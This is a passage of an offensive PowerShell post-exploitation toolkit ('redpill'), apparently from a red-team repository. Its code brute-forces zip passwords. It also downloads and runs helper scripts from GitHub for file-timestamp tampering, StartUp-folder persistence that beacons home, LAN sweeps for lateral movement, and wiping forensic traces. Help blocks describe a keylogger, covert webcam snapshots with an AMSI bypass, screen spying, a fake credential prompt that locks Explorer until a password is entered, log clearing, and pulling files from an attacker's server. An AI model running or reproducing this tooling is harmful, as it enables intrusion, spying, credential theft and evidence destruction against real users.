      If(-not(Test-Path -Path "$PassList") -or $SizeDump -lt 4002 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
         ## Fail to download password list using BitsTransfer OR the downloaded file is corrupted
         Write-Host "[abort] fail to download password list using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
         If(Test-Path -Path "$PassList"){Remove-Item -Path "$PassList" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @redpill
      }Else{## Dicionary file found\downloaded
         $tdfdr = $PassList.Split('\\')[-1]
         Write-Host "[i] dicionary $tdfdr Dowloaded!"
         Start-Sleep -Seconds 1
      }
   }
   
   ## Start Brute Force Attack
   $BruteTimer = Get-Date -Format 'HH:mm:ss'
   Write-Host "[+] $BruteTimer - starting brute force module!" -ForeGroundColor Green
   If(Test-Path "$7z" -EA SilentlyContinue){
      $passwords = Get-Content -Path "$PassList" -EA SilentlyContinue

      ForEach($Item in $passwords){
         If($Thepasswordis -eq $null){
            $brute = &"C:\Program Files\7-Zip\7z.exe" e "$BruteZip" -p"$Item" -y

            If($brute -contains "Everything is Ok"){
               $Thepasswordis = $Item
               Clear-Host;Start-Sleep -Seconds 1
               Write-Host "`n`n$BruteTimer - Brute force Zip archives" -ForegroundColor Green
               Write-Host "------------------------------------"
               Write-Host "Zip Archive  : $ZipArchiveName" -ForegroundColor Green
               Write-Host "Archive Size : $SizeDump/KB" -ForegroundColor Green
               Write-Host "Password     : $Thepasswordis" -ForegroundColor Green
               Write-Host "------------------------------------"
            } ## Brute IF
         } ## Check passwordis
      } ## Foreach Rule

   }Else{## 7Zip Isn't Installed
      Write-Host "[error] 7Zip Mandatory Appl doesn't appear to be installed!" -ForegroundColor Red -BackgroundColor Black
   }
   ## Clean Old files left behind
   If(Test-Path -Path "$PassList"){Remove-Item -Path "$PassList" -Force}
   Write-Host "";Start-Sleep -Seconds 1
}

If($FileMace -ne "false"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Change file mace time {timestamp}

   .DESCRIPTION
      This module changes the follow mace propertys:
      CreationTime, LastAccessTime, LastWriteTime

   .NOTES
      -Date parameter format: "08 March 1999 19:19:19"
      Remark: Double quotes are mandatory in -Date parameter

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -FileMace $Env:TMP\test.txt
      Changes sellected file mace using redpill default -Date "date-format"

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -FileMace $Env:TMP\test.txt -Date "08 March 1999 19:19:19"
      Changes sellected file mace using user inputed -Date "date-format"

   .OUTPUTS
      FullName                        Exists CreationTime       
      --------                        ------ ------------       
      C:\Users\pedro\Desktop\test.txt   True 08/03/1999 19:19:19
   #>

   ## Download FileMace.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\FileMace.ps1")){## Download FileMace.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/FileMace.ps1 -Destination $Env:TMP\FileMace.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\FileMace.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 1){## Corrupted download detected => DefaultFileSize: 1,96875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\FileMace.ps1"){Remove-Item -Path "$Env:TMP\FileMace.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## run the auxiliary mdule
   powershell -File "$Env:TMP\FileMace.ps1" -FileMace "$FileMace" -Date "$Date"

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\FileMace.ps1"){Remove-Item -Path "$Env:TMP\FileMace.ps1" -Force}
}

If($NetTrace -ieq "Enum"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Agressive sytem enumeration with netsh

   .NOTES
      Required Dependencies: netsh {native}
      Remark: Administrator privilges required on shell
      Remark: Dump will be saved under %TMP%\NetTrace.cab {default}
      
   .EXAMPLE
      PS C:> powershell -File redpill.ps1 -NetTrace Enum

   .EXAMPLE
      PS C:> powershell -File redpill.ps1 -NetTrace Enum -Storage %TMP%

   .OUTPUTS
      Trace configuration:
      -------------------------------------------------------------------
      Status:             Running
      Trace File:         C:\Users\pedro\AppData\Local\Temp\NetTrace.etl
      Append:             Off
      Circular:           On
      Max Size:           4096 MB
      Report:             Off
   #>

   ## Download NetTrace.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\NetTrace.ps1")){## Download NetTrace.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/NetTrace.ps1 -Destination $Env:TMP\NetTrace.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\NetTrace.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 2){## Corrupted download detected => DefaultFileSize: 2,267578125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\NetTrace.ps1"){Remove-Item -Path "$Env:TMP\NetTrace.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## run the auxiliary mdule
   powershell -File "$Env:TMP\NetTrace.ps1" -NetTrace Enum -Storage $Storage

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\NetTrace.ps1"){Remove-Item -Path "$Env:TMP\NetTrace.ps1" -Force}
}

If($Persiste -ne "false" -or $Persiste -ieq "Stop"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Persiste scripts using StartUp folder

   .DESCRIPTION
      This persistence module beacons home in sellected intervals defined
      by CmdLet User with the help of -BeaconTime parameter. The objective
      its to execute our script on every startup from 'xx' to 'xx' seconds.

   .NOTES
      Remark: Use double quotes if Path has any empty spaces in name.
      Remark: '-GetProcess Enum -ProcessName Wscript.exe' can be used
      to manual check the status of wscript process (BeaconHome function)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Persiste Stop
      Stops wscript process (vbs) and delete persistence.vbs script
      Remark: This function stops the persiste.vbs from beacon home
      and deletes persiste.vbs Leaving our reverse tcp shell intact.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Persiste `$Env:TMP\Payload.ps1
      Execute Payload.ps1 at every StartUp with 10 sec of interval between each execution

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Persiste `$Env:TMP\Payload.ps1 -BeaconTime 28
      Execute Payload.ps1 at every StartUp with 28 sec of interval between each execution

   .OUTPUTS
      Sherlock.ps1 Persistence Settings
      ---------------------------------
      BeaconHomeInterval : 10 (sec) interval
      ClientAbsoluctPath : Sherlock.ps1
      PersistenceScript  : C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Persiste.vbs
      PersistenceScript  : Successfuly Created!
      wscriptProcStatus  : Stopped! {require SKYNET restart}
      OR the manual execution of Persiste.vbs script! {StartUp}
   #>

   ## Download Persiste.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\Persiste.ps1")){## Download Persiste.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Persiste.ps1 -Destination $Env:TMP\Persiste.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\Persiste.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 6){## Corrupted download detected => DefaultFileSize: 6,1015625/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\Persiste.ps1"){Remove-Item -Path "$Env:TMP\Persiste.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($Persiste -ne "false" -and $Persiste -ne "Stop"){
       powershell -File "$Env:TMP\Persiste.ps1" -Persiste $Persiste -BeaconTime $BeaconTime
   }ElseIf($Persiste -ieq "Stop"){
       powershell -File "$Env:TMP\Persiste.ps1" -Persiste Stop
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\Persiste.ps1"){Remove-Item -Path "$Env:TMP\Persiste.ps1" -Force}
}

If($PingSweep -ieq "Enum" -or $PingSweep -ieq "Verbose"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate active IP Address {Local Lan}

   .DESCRIPTION
      Module to enumerate active IP address of Local Lan
      for possible Lateral Movement oportunitys. It reports
      active Ip address in local lan and scans for open ports
      in all active ip address found by -PingSweep Enum @arg.

   .NOTES
      Required Dependencies: .Net.Networkinformation.ping {native}
      Remark: Ping Sweep module migth take a long time to finish
      depending of -Range parameter user input sellection or if
      the Verbose @Argument its used to scan for open ports.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PingSweep Enum
      Enumerate All active IP Address on Local Lan {range 1..255}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PingSweep Enum -Range "65,72"
      Enumerate All active IP Address on Local Lan within the Range selected

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PingSweep Verbose -Range "65,72"
      Scans for IP address and open ports (top-ports) in all IP's found in Local Lan

   .OUTPUTS
      Range[65..72] Active IP Address on Local Lan
      --------------------------------------------
      Address       : 192.168.1.65
      Address       : 192.168.1.66
      Address       : 192.168.1.70
      Address       : 192.168.1.72
   #>

   ## Download PingSweep.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\PingSweep.ps1")){## Download PingSweep.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/PingSweep.ps1 -Destination $Env:TMP\PingSweep.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\PingSweep.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,9453125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\PingSweep.ps1"){Remove-Item -Path "$Env:TMP\PingSweep.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($PingSweep -ieq "Enum"){## Loop function {Sellected Range}
       powershell -File "$Env:TMP\PingSweep.ps1" -PingSweep Enum -Range $Range
   }ElseIf($PingSweep -ieq "Verbose"){
       powershell -File "$Env:TMP\PingSweep.ps1" -PingSweep Verbose -Range $Range
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\iprange.log"){Remove-Item -Path "$Env:TMP\iprange.log" -Force}
   If(Test-Path -Path "$Env:TMP\PingSweep.ps1"){Remove-Item -Path "$Env:TMP\PingSweep.ps1" -Force}
}

If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Clean Temp\Logs\Script artifacts

   .DESCRIPTION
      Module to clean artifacts that migth lead
      forensic investigatores to attacker steps.
      It deletes lnk, db, log, tmp files, recent
      folder, Prefetch, and registry locations.

   .NOTES
      Required Dependencies: cmd|regedit {native}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CleanTracks Clear

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CleanTracks Paranoid
      Remark: Paranoid @arg deletes @redpill aux scripts

   .OUTPUTS
      Function    Date     DataBaseEntrys ModifiedRegKeys ScriptsCleaned
      --------    ----     -------------- --------------- --------------
      CleanTracks 22:17:29 20             3               2
   #>

   ## Download CleanTracks.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\CleanTracks.ps1")){## Download CleanTracks.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CleanTracks.ps1 -Destination $Env:TMP\CleanTracks.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\CleanTracks.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,7587890625/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\CleanTracks.ps1"){Remove-Item -Path "$Env:TMP\CleanTracks.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($CleanTracks -ieq "Clear"){## Loop function {Sellected Range}
       powershell -File "$Env:TMP\CleanTracks.ps1" -CleanTracks Clear
   }ElseIf($CleanTracks -ieq "Paranoid"){
       powershell -File "$Env:TMP\CleanTracks.ps1" -CleanTracks Paranoid
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\CleanTracks.ps1"){Remove-Item -Path "$Env:TMP\CleanTracks.ps1" -Force}
}


## --------------------------------------------------------------
##       HELP =>  * PARAMETERS DETAILED DESCRIPTION *
## --------------------------------------------------------------


If($Help -ieq "sysinfo"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerates remote host basic system info

   .DESCRIPTION
      System info: IpAddress, OsVersion, OsFlavor, OsArchitecture,
      WorkingDirectory, CurrentShellPrivileges, ListAllDrivesAvailable
      PSCommandLogging, AntiVirusDefinitions, AntiSpywearDefinitions,
      UACsettings, WorkingDirectoryDACL, BehaviorMonitorEnabled, Etc..

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SysInfo Enum
      Remote Host Quick Enumeration Module

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SysInfo Verbose
      Remote Host Detailed Enumeration Module
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetDnsCache"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate remote host DNS cache entrys
      
   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetDnsCache Enum

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetDnsCache Clear
      Clear Dns Cache entrys {delete entrys}

   .OUTPUTS
      Entry                           Data
      -----                           ----
      example.org                     93.184.216.34
      play.google.com                 216.239.38.10
      www.facebook.com                129.134.30.11
      safebrowsing.googleapis.com     172.217.21.10
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetConnections"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Gets a list of ESTABLISHED connections (TCP)
   
   .DESCRIPTION
      Enumerates ESTABLISHED TCP connections and retrieves the
      ProcessName associated from the connection PID (Id) identifier
    
   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetConnections Enum
      Enumerates All ESTABLISHED TCP connections (IPV4 only)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetConnections Verbose
      Retrieves process info from the connection PID (Id) identifier

   .OUTPUTS
      Proto  Local Address          Foreign Address        State           Id
      -----  -------------          ---------------        -----           --
      TCP    127.0.0.1:58490        127.0.0.1:58491        ESTABLISHED     10516
      TCP    192.168.1.72:60547     40.67.254.36:443       ESTABLISHED     3344
      TCP    192.168.1.72:63492     216.239.36.21:80       ESTABLISHED     5512

      Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
      -------  ------    -----      -----     ------     --  -- -----------
          671      47    39564      28452       1,16  10516   4 firefox
          426      20     5020      21348       1,47   3344   0 svchost
         1135      77   252972     271880      30,73   5512   4 powershell
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetInstalled"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - List remote host applications installed

   .DESCRIPTION
      Enumerates appl installed and respective versions

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetInstalled Enum

   .OUTPUTS
      DisplayName                   DisplayVersion     
      -----------                   --------------     
      Adobe Flash Player 32 NPAPI   32.0.0.314         
      ASUS GIFTBOX                  7.5.24
      StarCraft II                  1.31.0.12601
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetProcess" -or $Help -ieq "ProcessName"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate/Kill running process

   .DESCRIPTION
      This CmdLet enumerates 'All' running process if used
      only the 'Enum' @arg IF used -ProcessName parameter
      then cmdlet 'kill' or 'enum' the sellected processName.

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetProcess Enum
      Enumerate ALL Remote Host Running Process(s)

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetProcess Enum -ProcessName powershell.exe
      Enumerate powershell.exe Process {Id,Name,Path,Description,Company,StartTime,Responding}

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetProcess Kill -ProcessName firefox.exe
      Kill Remote Host firefox.exe Running Process

   .OUTPUTS
      Id              : 5684
      Name            : powershell
      Description     : Windows PowerShell
      MainWindowTitle : @redpill v1.2.5 {SSA@RedTeam}
      ProductVersion  : 10.0.18362.1
      Path            : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
      Company         : Microsoft Corporation
      StartTime       : 29/01/2021 20:09:57
      HasExited       : False
      Responding      : True
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetTasks" -or $Help -ieq "TaskName" -or $Help -ieq "Interval" -or $Help -ieq "Exec"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate\Create\Delete running tasks

   .DESCRIPTION
      This module enumerates remote host running tasks
      Or creates a new task Or deletes existence tasks

   .NOTES
      Required Dependencies: cmd|schtasks {native}
      Remark: Module parameters are auto-set {default}
      Remark: Tasks have the default duration of 9 hours.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetTasks Enum

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetTasks Create
      Use module default settings to create demonstration task

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetTasks Delete -TaskName mytask
      Deletes mytask {demonstration task} by is taskname

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetTasks Create -TaskName mytask -Interval 10 -Exec "cmd /c start calc.exe"
      Creates 'mytask' taskname that executes 'calc.exe' with 10 minutes of interval and 9 hours of duration

   .OUTPUTS
      TaskName                                 Next Run Time          Status
      --------                                 -------------          ------
      mytask                                   24/01/2021 17:43:44    Running
      ASUS Smart Gesture Launcher              N/A                    Ready          
      CreateExplorerShellUnelevatedTask        N/A                    Ready          
      OneDrive Standalone Update Task-S-1-5-21 24/01/2021 17:43:44    Ready 
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetLogs" -or $Help -ieq "NewEst"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate\Clear eventvwr logs

   .NOTES
      Required Dependencies: wevtutil {native}
      The Clear @argument requires Administrator privs
      on shell to be abble to 'Clear' Eventvwr entrys.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Enum
      Lists ALL eventvwr categorie entrys

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Verbose
      List the newest 10 (default) Powershell\Application\System entrys

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Verbose -NewEst 28
      List the newest 28 Eventvwr Powershell\Application\System entrys

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Clear
      Remark: Clear @arg requires Administrator privs on shell

   .OUTPUTS
      Max(K) Retain OverflowAction    Entries Log                   
      ------ ------ --------------    ------- ---                            
      20 480      0 OverwriteAsNeeded   1 024 Application           
      20 480      0 OverwriteAsNeeded       0 HardwareEvents                 
      20 480      0 OverwriteAsNeeded      74 System                
      15 360      0 OverwriteAsNeeded      85 Windows PowerShell
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetBrowsers"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Leak Installed Browsers Information

   .NOTES
      This module downloads GetBrowsers.ps1 from venom
      GitHub repository into remote host %TMP% directory,
      And identify install browsers and run enum modules.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetBrowsers Enum
      Identify installed browsers and versions

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetBrowsers Verbose
      Run enumeration modules againts ALL installed browsers

   .OUTPUTS
      Browser   Install   Status   Version         PreDefined
      -------   -------   ------   -------         ----------
      IE        Found     Stoped   9.11.18362.0    False
      CHROME    False     Stoped   {null}          False
      FIREFOX   Found     Active   81.0.2          True
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Screenshot" -or $Help -ieq "Delay"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Capture remote desktop screenshot(s)

   .DESCRIPTION
      This module can be used to take only one screenshot
      or to spy target user activity using -Delay parameter.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Screenshot 1
      Capture 1 desktop screenshot and store it on %TMP%.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Screenshot 5 -Delay 8
      Capture 5 desktop screenshots with 8 secs delay between captures.

   .OUTPUTS
      ScreenCaptures Delay  Storage                          
      -------------- -----  -------                          
      1              1(sec) C:\Users\pedro\AppData\Local\Temp
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Camera"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @tedburke|@r00t-3xp10it
      Helper - List computer device names or capture snapshot

   .NOTES
      Remark: WebCam turns the ligth 'ON' taking snapshots.
      Using -Camera Snap @argument migth trigger AV detection
      Unless target system has powershell version 2 available.
      In that case them PS version 2 will be used to execute
      our binary file and bypass AV amsi detection.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Camera Enum
      List ALL WebCams Device Names available

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Camera Snap
      Take one screenshot using default camera

   .OUTPUTS
      StartTime ProcessName DeviceName           
      --------- ----------- ----------           
      17:32:23  CommandCam  USB2.0 VGA UVC WebCam
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "StartWebServer" -or $Help -ieq "SPort"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @MarkusScholtes|@r00t-3xp10it
      Helper - Start Local HTTP WebServer (Background)

   .NOTES
      Access WebServer: http://<RHOST>:8080/
      This module download's webserver.ps1 or Start-WebServer.ps1
      to remote host %TMP% and executes it on an hidden terminal prompt
      to allow users to silent browse/read/download files from remote host.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -StartWebServer Python
      Downloads webserver.ps1 to %TMP% and executes the webserver.
      Remark: This Module uses Social Enginnering to trick remote host into
      installing python (python http.server) if remote host does not have it.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -StartWebServer Python -SPort 8087
      Downloads webserver.ps1 and executes the webserver on port 8087

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -StartWebServer Powershell
      Downloads Start-WebServer.ps1 and executes the webserver.
      Remark: Admin privileges are requiered in shell to run the WebServer

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -StartWebServer Powershell -SPort 8087
      Downloads Start-WebServer.ps1 and executes the webserver on port 8087
      Remark: Admin privileges are requiered in shell to run the WebServer
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Upload" -or $Help -ieq "ApacheAddr" -or $Help -ieq "Destination"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Download files from attacker {apache2}

   .NOTES
      Required Attacker Dependencies: apache2 webroot
      Required Target Dependencies: BitsTransfer {native}
      File to Download must be stored in attacker apache2 webroot.
      -Upload and -ApacheAddr Are Mandatory parameters (required).
      -Destination parameter its auto set to `$Env:TMP by default.

   .EXAMPLE
      Syntax : .\redpill.ps1 -Upload [ file.ps1 ] -ApacheAddr [ Attacker ] -Destination [ full\Path\file.ps1 ]
      Example: powershell -File redpill.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination `$Env:TMP\FileName.ps1
      Download FileName.ps1 script from attacker apache2 (192.168.1.73) into `$Env:TMP\FileName.ps1 Local directory.
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Keylogger"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Capture remote host keystrokes {void}

   .DESCRIPTION
      This module start recording target system keystrokes
      in background mode and only stops if void.exe binary
      its deleted or is process {void.exe} its stoped.

   .NOTES
      Required Dependencies: void.exe {auto-install}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Keylogger Start
      Start recording target system keystrokes

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Keylogger Stop
      Stop keylogger by is process FileName identifier and delete
      keylogger script and all respective files/logs left behind.

   .OUTPUTS
      StartTime ProcessName PID  LogFile                                   
      --------- ----------- ---  -------                                   
      17:37:17  void.exe    2836 C:\Users\pedro\AppData\Local\Temp\void.log
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Mouselogger" -or $Help -ieq "Timmer"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Capture screenshots of MouseClicks for 'xx' Seconds

   .DESCRIPTION
      This script allow users to Capture Screenshots of 'MouseClicks'
      with the help of psr.exe native windows 10 (error report service).
      Remark: Capture will be stored under '`$Env:TMP' remote directory.
      'Min capture time its 8 secs the max is 300 and 100 screenshots'.

   .NOTES
      Required Dependencies: psr.exe {native}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Mouselogger Start
      Capture Screenshots of Mouse Clicks for 10 secs {default}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Mouselogger Start -Timmer 28
      Capture Screenshots of remote Mouse Clicks for 28 seconds

   .OUTPUTS
      Capture     Timmer      Storage                                          
      -------     ------      -------                                          
      MouseClicks for 10(sec) C:\Users\pedro\AppData\Local\Temp\SHot-zcsV03.zip
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "PhishCreds"){
$HelpParameters = @"

   <#!Help.
      Author: @mubix|@r00t-3xp10it
      Helper - Promp the current user for a valid credential.

   .DESCRIPTION
      This CmdLet interrupts EXPLORER process until a valid credential is entered
      correctly in Windows PromptForCredential MsgBox, only them it starts EXPLORER
      process and leaks the credentials on this terminal shell (Social Engineering).

   .NOTES
      Remark: CredsPhish.ps1 CmdLet its set for 30 fail validations before abort.
      Remark: CredsPhish.ps1 CmdLet requires lmhosts + lanmanserver services running.
      Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PhishCreds Start
      Prompt the current user for a valid credential.

   .OUTPUTS
      Captured Credentials (logon)
      ----------------------------
      TimeStamp : 01/17/2021 15:26:24
      username  : r00t-3xp10it
      password  : mYs3cr3tP4ss
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "EOP"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @_RastaMouse|@r00t-3xp10it {Sherlock v1.3}
      Helper - Find Missing Software Patchs For Privilege Escalation

   .NOTES
      This Module does NOT exploit any EOP vulnerabitys found.
      It will 'report' them and display the exploit-db POC link.
      Remark: Attacker needs to manualy download\execute the POC.
      Sherlock.ps1 GitHub WIKI page: https://tinyurl.com/y4mxe29h

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -EOP Enum
      Scans GroupName Everyone and permissions (F)
      Unquoted Service vuln Paths, Dll-Hijack, etc.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -EOP Verbose
      Scans the Three Group Names and Permissions (F)(W)(M)
      And presents a more elaborate report with extra tests.

   .OUTPUTS
      Title      : TrackPopupMenu Win32k Null Point Dereference
      MSBulletin : MS14-058
      CVEID      : 2014-4113
      Link       : https://www.exploit-db.com/exploits/35101/
      VulnStatus : Appers Vulnerable
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Persiste" -or $Help -ieq "BeaconTime"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Persiste scripts using StartUp folder

   .DESCRIPTION
      This persistence module beacons home in sellected intervals defined
      by CmdLet User with the help of -BeaconTime parameter. The objective
      its to execute our script on every startup from 'xx' to 'xx' seconds.

   .NOTES
      Remark: Use double quotes if Path has any empty spaces in name.
      Remark: '-GetProcess Enum -ProcessName Wscript.exe' can be used
      to manual check the status of wscript process (BeaconHome function)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Persiste Stop
      Stops wscript process (vbs) and delete persistence.vbs script
      Remark: This function stops the persiste.vbs from beacon home
      and deletes persiste.vbs Leaving our reverse tcp shell intact.

   .EXAMPLE
